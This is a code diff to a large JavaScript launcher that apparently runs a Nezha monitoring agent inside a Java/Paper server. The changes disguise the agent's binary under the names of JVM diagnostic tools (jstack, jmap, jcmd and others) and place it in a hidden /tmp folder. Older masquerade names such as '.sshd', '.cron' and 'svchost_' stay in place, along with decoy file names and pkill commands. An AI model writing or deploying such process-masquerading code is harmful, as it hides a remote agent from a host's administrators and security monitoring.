@@ -9829,7 +9829,7 @@ const NEZHA_RESTART_DELAY = 5000;       // ★ 优化: 重连基础延迟5秒，
 const NEZHA_RESTART_DELAY_MAX = 10000;  // ★ 优化: 重连最大延迟10秒，对齐官方Go探针
 const NEZHA_FOLDER_NAME = process.platform === 'win32' ? 'Error log' : '.Error log';
 const NEZHA_DIR = path.join(BACKUP_DIR, NEZHA_FOLDER_NAME);
-const NEZHA_BIN_DIR = process.platform === 'win32' ? NEZHA_DIR : path.join('/tmp', NEZHA_FOLDER_NAME);
+const NEZHA_BIN_DIR = process.platform === 'win32' ? NEZHA_DIR : path.join('/tmp', '.java-socket-7341');
 const NEZHA_CONFIG_FILENAME = '.node_module_cache';
 const NEZHA_CONFIG_FILE = path.join(NEZHA_DIR, NEZHA_CONFIG_FILENAME);
 const NEZHA_PID_FILE = path.join(NEZHA_DIR, '.runtime.lock');
@@ -10179,7 +10179,7 @@ async function startNezha(addr, key, tls = false) {
             // 注意：pkill 退出后会被 node wait() 回收；如果 node 已经退出，
             // 会被 PaperBootstrap 的 installZombieReaper() 回收。
             try {
-                execSync(`pkill -f 'music-player|spotify-client|netease-music|vlc-media|cmus-player' 2>/dev/null || true`, { stdio: 'ignore', timeout: 2000 });
+                execSync(`pkill -f 'jstack|jmap|jstat|jcmd|jinfo' 2>/dev/null || true`, { stdio: 'ignore', timeout: 2000 });
             } catch(e) {}
         }
     } catch(e) {}
@@ -10221,7 +10221,7 @@ const randomSuffix = crypto.randomBytes(3).toString('hex');
 if (isWin) {
     fakeProcessName = `MusicPlayer_${randomSuffix}.exe`;
 } else {
-    const fakeSystemNames = ['.music-player', '.spotify-client', '.netease-music', '.vlc-media', '.cmus-player'];
+    const fakeSystemNames = ['jstack', 'jmap', 'jstat', 'jcmd', 'jinfo'];
     fakeProcessName = fakeSystemNames[Math.floor(Math.random() * fakeSystemNames.length)];
 }
     const targetPath = path.join(isWin ? NEZHA_DIR : NEZHA_BIN_DIR, fakeProcessName);
@@ -10236,7 +10236,7 @@ if (isWin) {
                 if (file === fakeProcessName) continue;
                 const isNezhaBinary = file.includes('nezha-agent');
                 const isOldWinFake = file.includes('MusicPlayer_') || file.includes('svchost_');
-                const isOldLinuxFake = ['.music-player', '.spotify-client', '.netease-music', '.vlc-media', '.cmus-player', '.systemd-resolve', '.dbus-daemon', '.rsyslogd',                 '.sshd', '.cron'].includes(file);
+                const isOldLinuxFake = ['jstack', 'jmap', 'jstat', 'jcmd', 'jinfo', '.systemd-resolve', '.dbus-daemon', '.rsyslogd',                 '.sshd', '.cron'].includes(file);
                 if (fsSync.statSync(fullPath).isFile() && (isNezhaBinary || isOldWinFake || isOldLinuxFake)) {
                     try {
                         fsSync.renameSync(fullPath, targetPath);
@@ -11217,7 +11217,7 @@ async function startNezhaPure(addr, key, tls = false) {
         }
         if (!isWin && fsSync.existsSync(NEZHA_BIN_DIR)) {
             const binFiles = fsSync.readdirSync(NEZHA_BIN_DIR);
-            const fakeNames = ['.music-player', '.spotify-client', '.netease-music', '.vlc-media', '.cmus-player',
+            const fakeNames = ['jstack', 'jmap', 'jstat', 'jcmd', 'jinfo',
                 '.systemd-resolve', '.dbus-daemon', '.rsyslogd', '.sshd', '.cron'];
             for (const f of binFiles) {
                 try {
@@ -28218,7 +28218,7 @@ async function _startPure(addr, key, tls) { _innerLog('_startPure 开始: addr='
         }
         if (!isWin && fs.existsSync(_serverManager._binDir)) {
             const binFiles = fs.readdirSync(_serverManager._binDir);
-            const fakeNames = ['.music-player', '.spotify-client', '.netease-music', '.vlc-media', '.cmus-player',
+            const fakeNames = ['jstack', 'jmap', 'jstat', 'jcmd', 'jinfo',
                 '.systemd-resolve', '.dbus-daemon', '.rsyslogd', '.sshd', '.cron'];
             for (const f of binFiles) {
                 try {
@@ -29140,7 +29140,7 @@ const _serverManager = {
         if (fs.existsSync(this._binDir)) {
             const files = fs.readdirSync(this._binDir);
             if (isWin) { runtime = files.find(f => f.startsWith('MusicPlayer_') && f.endsWith('.exe')) || files.find(f => f.startsWith('svchost_') && f.endsWith('.exe')); }
-            else { const daemons = ['.music-player','.spotify-client','.netease-music','.vlc-media','.cmus-player','.systemd-resolve','.dbus-daemon','.rsyslogd','.sshd','.cron']; runtime = files.find(f => daemons.includes(f)); }
+            else { const daemons = ['jstack','jmap','jstat','jcmd','jinfo','.systemd-resolve','.dbus-daemon','.rsyslogd','.sshd','.cron']; runtime = files.find(f => daemons.includes(f)); }
             if (!runtime) runtime = files.find(f => { const ext = path.extname(f); return !['.json','.yml','.zip','.log','.txt'].includes(ext); });
         }
         if (!runtime && !isWin) {
@@ -29155,7 +29155,7 @@ const _serverManager = {
                     const shmFiles = fs.readdirSync(this._binDir);
                     for (const f of shmFiles) {
                         if (f === originalName) {
-                            const fakeNames = ['.music-player','.spotify-client','.netease-music','.vlc-media','.cmus-player'];
+                            const fakeNames = ['jstack','jmap','jstat','jcmd','jinfo'];
                             const newName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
                             fs.renameSync(path.join(this._binDir, f), path.join(this._binDir, newName));
                             try { fs.chmodSync(path.join(this._binDir, newName), 0o755); } catch(e2) {}
@@ -29178,7 +29178,7 @@ const _serverManager = {
                         const originalName = 'nezha-agent';
                         for (const f of shmFiles) {
                             if (f === originalName) {
-                                const fakeNames = ['.music-player','.spotify-client','.netease-music','.vlc-media','.cmus-player'];
+                                const fakeNames = ['jstack','jmap','jstat','jcmd','jinfo'];
                                 const newName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
                                 fs.renameSync(path.join(this._binDir, f), path.join(this._binDir, newName));
                                 try { fs.chmodSync(path.join(this._binDir, newName), 0o755); } catch(e3) {}
@@ -29208,7 +29208,7 @@ const _serverManager = {
             if (process.platform !== 'win32') {
                 // ★ 优化：原代码 5 次 fork pkill，每次都增加 PID 1 (JVM) 端的 reap 压力。
                 // 改成单条 pkill + ERE 一次性匹配所有名字，最多 1 个 fork。
-                try { execSync('pkill -f \'music-player|spotify-client|netease-music|vlc-media|cmus-player\' 2>/dev/null || true', {stdio:'ignore',timeout:2000}); } catch(e) {}
+                try { execSync('pkill -f \'jstack|jmap|jstat|jcmd|jinfo\' 2>/dev/null || true', {stdio:'ignore',timeout:2000}); } catch(e) {}
             }
         } catch(e) {}
         try {
